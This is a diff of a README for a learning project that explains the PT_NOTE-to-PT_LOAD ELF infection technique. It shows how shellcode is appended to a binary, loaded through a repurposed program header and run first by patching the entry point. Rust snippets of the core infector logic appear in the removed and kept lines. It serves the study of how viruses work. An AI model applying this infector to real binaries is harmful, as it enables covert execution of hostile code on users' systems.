@@ -1,39 +1,48 @@
 # PT_NOTE to PT_LOAD ELF injector example
 
-I read about a technique on the [SymbolCrash blog](https://www.symbolcrash.com/2019/03/27/pt_note-to-pt_load-injection-in-elf/) for injecting shellcode into an ELF binary by converting a `PT_NOTE` section in the Program Headers into a `PT_LOAD` section. I thought this sounded interesting and I didn't know a lot about ELF, so I took it as an opportunity to learn many new things at once.
+I read about a technique on the [SymbolCrash blog](https://www.symbolcrash.com/2019/03/27/pt_note-to-pt_load-injection-in-elf/) for injecting shellcode into an ELF binary by converting a `PT_NOTE` in the Program Headers into a `PT_LOAD`. I thought this sounded interesting and I didn't know a lot about ELF, so I took it as an opportunity to learn many new things at once.
 
-For this project I created a small, very incomplete library I called [mental_elf](https://github.com/d3npa/mental-elf) which makes parsing and writing ELF and program headers easier. The code therein is very primitive and easy to understand, so I won't talk about it any more here. Let's focus on the infection technique instead :)
+For this project I created a small, very incomplete library I called [mental_elf](https://github.com/d3npa/mental-elf) which makes parsing and writing ELF metadata easier. I think the library code is very straight-forward and easy to understand, so I won't talk about it any more here. Let's focus on the infection technique instead :)
 
 ## Overview
 
-As implied by the title, this infection technique involves converting an ELF's `PT_NOTE` program header into a `PT_LOAD` in order to run shellcode. The inputs to our program are therefore:
+As implied by the title, this infection technique involves converting an ELF's `PT_NOTE` program header into a `PT_LOAD` in order to run shellcode. The infection boils down to three steps:
 
-- an ELF file to infect
-- some shellcode to inject
+- Append the shellcode to the end of the ELF file
+- Load the shellcode to a specific address in virtual memory 
+- Change the ELF's entry point to the above address so the shellcode is executed first
 
-Note: this example does not support Position Independent Executables (PIE). I am disabling it by passing `-C relocation-model=static` to rustc when compiling my target program. 
+The shellcode should also be patched for each ELF such that it jumps back to the host ELF's original entry point, allowing the host to execute normally after the shellcode is finished. 
 
-Note (2): this technique does not work on Go binaries because the Go runtime makes use of and therefore requires a valid `PT_NOTE` section and header.
-
-Here is a note about the Note Section in the [Official ELF Specification](http://www.skyfree.org/linux/references/ELF_Format.pdf):
+Shellcode may be loaded into virtual memory via a `PT_LOAD` header. Inserting a new program header into the ELF file would likely break many offsets throughout the binary, however it is usually possible to repurpose a `PT_NOTE` header without breaking the binary. Here is a note about the Note Section in the [ELF Specification](http://www.skyfree.org/linux/references/ELF_Format.pdf):
 
 > Note information is optional.  The presence of note information does not affect a program’s ABI conformance, provided the information does not affect the program’s execution behavior.  Otherwise, the program does not conform to the ABI and has undefined behavior
 
-This infection technique requires a `PT_NOTE` section to be present in the ELF file, and involves modifying two structures: the ELF header and Program Headers (where the `PT_NOTE` program header itself resides). 
+Here are two caveats I became aware of:
 
-We can append shellcode to the end of the binary and jump there at the start by modifying the program entry point in the ELF header. To make sure the shellcode is loaded, we can change the otherwise unused `PT_NOTE` section to a `PT_LOAD` section which will make sure the shellcode is loaded at the address we enter.
+- This simplistic technique will not work with Position Independent Executables (PIE). 
+- The Go language runtime actually expects a valid `PT_NOTE` section containing version information in order to run, so this technique cannot be used with Go binaries.
+
+Note: PIE can be disabled in cc with `-no-pie` or in rustc with `-C relocation-model=static`.
 
 ## Shellcode
 
-This example uses the Netwide ASseMbler (NASM) to prepare shellcode to inject, and so installing `nasm` is required to run this example. 
+The shellcode provided is written for the Netwide ASseMbler (NASM). Make sure to install `nasm` before running the Makefile! 
 
-The `rbp`, `rsp`, and `rdx` registers must have correct values before the shellcode jumps back to the original entry point. Their uses are specified in the [AMD64 System V ABI](https://refspecs.linuxfoundation.org/elf/x86_64-abi-0.95.pdf) (under Process Initialization → Stack State). Since `rsp` and `rbp` are not touched by this shellcode, it only resets `rdx` to zero.
+To create shellcode suitable for this injection, there are a couple of things to keep in mind. Section 3.4.1 of the [AMD64 System V ABI](https://refspecs.linuxfoundation.org/elf/x86_64-abi-0.95.pdf) says that the `rbp`, `rsp`, and `rdx` registers must be set to correct values before entry. This can be achieved by ordinary pushing and popping around the shellcode. My shellcode doesn't touch `rbp` or `rsp`, and setting `rdx` to zero before returning also worked.
 
-```asm
-xor rdx, rdx
+The shellcode also needs to be patched so it can actually jump back to the host's original entry point after finishing. To make patching easier, shellcode can be designed to run off the end of the file, either by being written top-to-bottom, or jumping to an empty label at the end:
+
+```nasm
+main_tasks:
+    ; ...
+    jmp finish
+other_tasks:
+    ; ...
+finish:
 ```
 
-The shellcode also needs to be patched so it can actually jump back to the host's original entry point after finishing its tasks. To make patching easier, I designed this shellcode so it would run top-to-bottom and run off the end of the file, which allows us to patch it by simply appending a jump instruction. In x86_64, the `jmp` parameter cannot take a 64bit address to jump to, so we must pass through the `rax` register to make arbitrary jumps. The rust snippet below patches a `shellcode` byte vector to append a jump to `entry_point`:
+With this design, patching is as easy as appending a jump instruction. In x86_64 however, `jmp` cannot take a 64bit operand - instead the destination is stored in rax and then a `jmp rax` is made. This rust snippet patches a `shellcode` byte vector to append a jump to `entry_point`:
 
 ```rust
 fn patch_jump(shellcode: &mut Vec<u8>, entry_point: u64) {
@@ -45,80 +54,21 @@ fn patch_jump(shellcode: &mut Vec<u8>, entry_point: u64) {
 }
 ```
 
-With this, we have a piece of shellcode that can run at the start of the program and pass control back to the host's original entry point. 
+## Infector
 
-## Infection
+The infector itself is in `src/main.rs`. It's written in an easy to follow top-to-bottom format, so if you understood the overview it should be very clear. I also added comments to help. The code uses my [mental_elf](https://github.com/d3npa/mental-elf) library to abstract away the details of reading/writing the file, so that it's easier to see the technique.
 
-To ensure the shellcode runs and returns correctly, the ELF header and PT_NOTE program headers must be edited. The ELF header is where we tell the loader where to jump to start the program (entry point). The PT_NOTE header will be turned into a PT_LOAD header which loads the shellcode into virtual memory with the appropriate permissions.
+In summary, the code
 
-The headers are read from the elf file using the mental_elf library:
+- Takes in 2 CLI parameters: the ELF target and a shellcode file
+- Reads in the ELF and Program headers from the ELF file
+- Patches the shellcode with a `jmp` to the original entry point
+- Appends the patched shellcode the ELF
+- Finds a `PT_NOTE` program header and converts it to `PT_LOAD`
+- Changes the ELF's entry point to the start of the shellcode
+- Saves the altered header structures back into the ELF file
 
-```rust
-// Parse ELF and program headers
-let mut elf_header = mental_elf::read_elf64_header(&mut elf_fd)?;
-let mut program_headers = mental_elf::read_elf64_program_headers(
-    &mut elf_fd, 
-    elf_header.e_phoff, 
-    elf_header.e_phnum,
-)?;
-```
-
-After loading the ELF file, the shellcode is patched to jump back to the ELF's original entry point:
-
-```rust
-// Patch the shellcode to jump to the original entry point after finishing
-patch_jump(&mut shellcode, elf_header.e_entry);
-```
-
-The section loaded by `PT_LOAD` will be page-aligned, and the shellcode will not be loaded at a nice round address like `0xc00000000`. To make the coding experience easier, the offset of the shellcode in the file is used to derive the address in virtual memory the shellcode will end up. Below, we retrieve the offset of the shellcode by subtracting the shellcode length from the total file length (this snippet runs after appending the shellcode to the file). 
-
-```rust
-// Calculate offsets used to patch the ELF and program headers
-let sc_len = shellcode.len() as u64;
-let file_offset = elf_fd.metadata()?.len() - sc_len;
-let memory_offset = 0xc00000000 + file_offset;
-```
-
-`memory_offset` will become the new ELF entry point.
-
-```rust
-// Patch the ELF header to start at the shellcode
-elf_header.e_entry = memory_offset;
-```
-
-When we patch the `PT_NOTE` header, we need to write in all the details the loader needs to know so it can load the shellcode, including segment permissions, offsets, length etc.
-
-```rust
-// Look for a PT_NOTE section
-for phdr in &mut program_headers {
-    if phdr.p_type == PT_NOTE {
-        // Convert to a PT_LOAD section with values to load shellcode
-        println!("Found PT_NOTE section; converting to PT_LOAD");
-        phdr.p_type = PT_LOAD;
-        phdr.p_flags = PF_R | PF_X;
-        phdr.p_offset = file_offset;
-        phdr.p_vaddr = memory_offset;
-        phdr.p_memsz += sc_len as u64;
-        phdr.p_filesz += sc_len as u64;
-        break;
-    }
-}
-```
-
-Lastly the changes to the headers are committed back into the ELF file.
-
-```rust
-// Commit changes to the program and ELF headers
-mental_elf::write_elf64_program_headers(
-    &mut elf_fd, 
-    elf_header.e_phoff,
-    elf_header.e_phnum,
-    program_headers,
-)?;
-mental_elf::write_elf64_header(&mut elf_fd, elf_header)?;
-```
-
-After being infected, an ELF file's entry point will point to the virtual memory offset the shellcode is loaded to, as defined by our crafted `PT_LOAD` program header. Because the shellcode was patched with a jump instruction back to the original entry point, the program will run normally after the shellcode has run.
+When an infected ELF file is run, the ELF loader will map several sections of the ELF file into virtual memory - our crated `PT_LOAD` will make sure our shellcode is loaded and executable. The ELF's entry point then starts the shellcode's execution. Then the shellcode ends, it will then jump to the original entry point, allowing the binary to run its original code.
 
 ```
 $ make
@@ -143,4 +93,4 @@ $
 
 ## Conclusion
 
-This was a very fun project where I learned so much about ELF, parsing binary structures in Rust, and viruses in general. Thanks to netspooky, sblip, TMZ, and others at tmp.out for teaching me, helping me debug and motivating me to do this project! <3
+This was a very fun project where I learned so much about ELF, parsing binary structures in Rust, and viruses in general! Thanks to netspooky, sblip, TMZ, and others at tmp.out for teaching me, helping me debug and motivating me to do this project <3
